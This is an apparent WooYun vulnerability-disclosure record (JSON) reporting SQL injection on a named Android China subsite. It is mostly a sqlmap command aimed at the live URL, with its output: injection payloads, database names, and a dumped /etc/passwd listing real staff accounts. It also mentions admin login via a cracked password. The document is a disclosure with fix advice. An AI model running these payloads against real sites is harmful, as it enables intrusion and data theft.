{"id": 60025, "wybug_id": "wooyun-2013-045088", "wybug_title": "安卓中国#某分站存在SQL注射导致后台沦陷", "wybug_corp": "安卓中国", "wybug_author": "Mr.leo", "wybug_date": "2013-12-06 11:39", "wybug_open_date": "2014-01-20 11:39", "wybug_type": "SQL注射漏洞", "wybug_level": "高", "wybug_rank_0": "15", "wybug_status": "未联系到厂商或者厂商积极忽略", "wybug_from": "http://www.wooyun.org", "wybug_tags": ["管理后台对外", "后台被猜解", "注射技巧"], "wybug_detail": "漏洞详情 披露状态：   \t\t\t\t\t\t\t\t\t2013-12-06：\t积极联系厂商并且等待厂商认领中，细节不对外公开\t\t\t\t\t\t\t\t\t2014-01-20：\t厂商已经主动忽略漏洞，细节向公众公开  简要描述： 安卓中国#某分站存在SQL注射导致后台沦陷 详细说明：  站点：http://coolpad.anzhuo.cn注入点：mt参数没有过滤，导致注射sqlmap.py -u \"http://coolpad.anzhuo.cn/rank.php?keyword=&mt=1\" -p \"mt\" --dbs --current-user --current-db[root@Hacker~]# Sqlmap sqlmap.py -u \"http://coolpad.anzhuo.cn/rank.php?keyword=&mt=1\" -p \"mt\" --dbs --current-user --current-db    sqlmap/1.0-dev - automatic SQL injection and database takeover tool    http://sqlmap.org[!] legal disclaimer: Usage of sqlmap for attacking targets without prior mutual consent is illegal. It is the end user's responsibility to obey all applicablelocal, state and federal laws. Developers assume no liability and are not responsible for any misuse or damage caused by this program[*] starting at 09:36:52[09:36:53] [INFO] resuming back-end DBMS 'mysql'[09:36:53] [INFO] testing connection to the target urlsqlmap identified the following injection points with a total of 0 HTTP(s) requests:---Place: GETParameter: mt    Type: boolean-based blind    Title: AND boolean-based blind - WHERE or HAVING clause    Payload: keyword=&mt=1 AND 1460=1460    Type: UNION query    Title: MySQL UNION query (NULL) - 25 columns    Payload: keyword=&mt=1 LIMIT 1,1 UNION ALL SELECT CONCAT(0x3a776f633a,0x57474e574b79737a4668,0x3a646a673a), NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL,NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL#    Type: AND/OR time-based blind    Title: MySQL > 5.0.11 AND time-based blind    Payload: keyword=&mt=1 AND SLEEP(5)---[09:36:53] [INFO] the back-end DBMS is MySQLweb application technology: Nginx, PHP 5.3.9back-end DBMS: MySQL 5.0.11[09:36:53] [INFO] fetching current usercurrent user:    'anzhuovoteuser@localhost'[09:36:53] [INFO] fetching current databasecurrent database:    'anzhuovote'[09:36:53] [INFO] fetching database namesavailable databases [56]:[*] android_rom[*] anzhuoblog[*] anzhuouucenter[*] anzhuovote[*] gobbs[*] information_schema[*] mail_system[*] mysql[*] talkphone[*] test[*] testultrax[*] ultrax[*] ultrax20120725[*] ultrax20130523萝卜\n\netc/passwordroot:x:0:0:root:/root:/bin/bashbin:x:1:1:bin:/bin:/sbin/nologindaemon:x:2:2:daemon:/sbin:/sbin/nologinadm:x:3:4:adm:/var/adm:/sbin/nologinlp:x:4:7:lp:/var/spool/lpd:/sbin/nologinsync:x:5:0:sync:/sbin:/bin/syncshutdown:x:6:0:shutdown:/sbin:/sbin/shutdownhalt:x:7:0:halt:/sbin:/sbin/haltmail:x:8:12:mail:/var/spool/mail:/sbin/nologinnews:x:9:13:news:/etc/news:uucp:x:10:14:uucp:/var/spool/uucp:/sbin/nologinoperator:x:11:0:operator:/root:/sbin/nologingames:x:12:100:games:/usr/games:/sbin/nologingopher:x:13:30:gopher:/var/gopher:/sbin/nologinftp:x:14:50:FTP User:/var/ftp:/sbin/nologinnobody:x:99:99:Nobody:/:/sbin/nologinnscd:x:28:28:NSCD Daemon:/:/sbin/nologinvcsa:x:69:69:virtual console memory owner:/dev:/sbin/nologinpcap:x:77:77::/var/arpwatch:/sbin/nologinrpc:x:32:32:Portmapper RPC user:/:/sbin/nologinmailnull:x:47:47::/var/spool/mqueue:/sbin/nologinsmmsp:x:51:51::/var/spool/mqueue:/sbin/nologinrpcuser:x:29:29:RPC Service User:/var/lib/nfs:/sbin/nologinnfsnobody:x:4294967294:4294967294:Anonymous NFS User:/var/lib/nfs:/sbin/nologinsshd:x:74:74:Privilege-separated SSH:/var/empty/sshd:/sbin/nologindbus:x:81:81:System message bus:/:/sbin/nologinhaldaemon:x:68:68:HAL daemon:/:/sbin/nologinavahi-autoipd:x:100:101:avahi-autoipd:/var/lib/avahi-autoipd:/sbin/nologinavahi:x:70:70:Avahi daemon:/:/sbin/nologinntp:x:38:38::/etc/ntp:/sbin/nologinxfs:x:43:43:X Font Server:/etc/X11/fs:/sbin/nologingdm:x:42:42::/var/gdm:/sbin/nologinsabayon:x:86:86:Sabayon user:/home/sabayon:/sbin/nologinjb_backup:x:500:100::/home/jb_backup:/sbin/nologinjb-zhgao:x:501:100::/home/jb-zhgao:/bin/bashjb_task:x:502:100::/home/jb_task:/sbin/nologinjb_share:x:503:100::/home/jb_share:/sbin/nologinjb-hhliu:x:504:100::/home/jb-hhliu:/bin/bashjb-wqzeng:x:505:100::/home/jb-wqzeng:/sbin/nologinjb-xwyu:x:506:100::/home/jb-xwyu:/sbin/nologinjb-sjliu:x:507:100::/home/jb-sjliu:/bin/bashjb-xszhang:x:508:100::/home/jb-xszhang:/sbin/nologinjb-dbchen:x:510:100::/home/jb-dbchen:/sbin/nologinzabbix:x:512:512::/home/zabbix:/sbin/nologinmysql:x:513:513::/home/mysql:/sbin/nologinwww:x:514:514::/home/www:/sbin/nologinjb-xiaohu:x:515:100::/home/jb-xiaohu:/sbin/nologinjb-wlyin:x:516:100::/home/jb-wlyin:/sbin/nologinapache:x:48:48:Apache:/var/www:/sbin/nologindistcache:x:94:94:Distcache:/:/sbin/nologinanzhuo_test:x:519:50::/data/www/anzhuo/:/sbin/nologinpostfix:x:89:89::/var/spool/postfix:/sbin/nologindovecot:x:97:97:dovecot:/usr/libexec/dovecot:/sbin/nologinanzhuo_ftp_cmod:x:521:50::/data/anzhuo/data/attachment/CMOD_RIDER/:/sbin/nologinanzhuo_ftp_dark:x:522:50::/data/anzhuo/data/attachment/dark/:/sbin/nologinjb-jinjliu:x:523:100::/home/jb-jinjliu:/bin/bashjb-wulian:x:524:100::/home/jb-wulian:/bin/bashnagios:x:525:525::/home/nagios:/sbin/nologinjb-jhgu:x:526:100::/home/jb-jhgu:/sbin/nologinjb-gengyuwei:x:527:100::/home/jb-gengyuwei:/bin/bash后台密码1分站之前已经被人改了(网站管理员or白帽子？) 幸好我截图了。。。。截取一张成功登录的界面和用户名密码，md5可查\n\n\n\nover   漏洞证明：  available databases [56]:[*] android_rom[*] anzhuoblog[*] anzhuouucenter[*] anzhuovote[*] gobbs[*] information_schema[*] mail_system[*] mysql[*] talkphone[*] test[*] testultrax[*] ultrax[*] ultrax20120725[*] ultrax20130523   修复方案：  1#修复注射漏洞2#屏蔽管理后台对外   版权声明：转载请注明来源 Mr.leo@乌云\n ", "wybug_reply": "漏洞回应  厂商回应： 未能联系到厂商或者厂商积极拒绝  ", "replys": "漏洞评价：\n评论\n  \n\n\n", "wybug_level_fromcorp": "无影响厂商忽略", "wybug_rank_fromcorp": 0, "Ranks": null}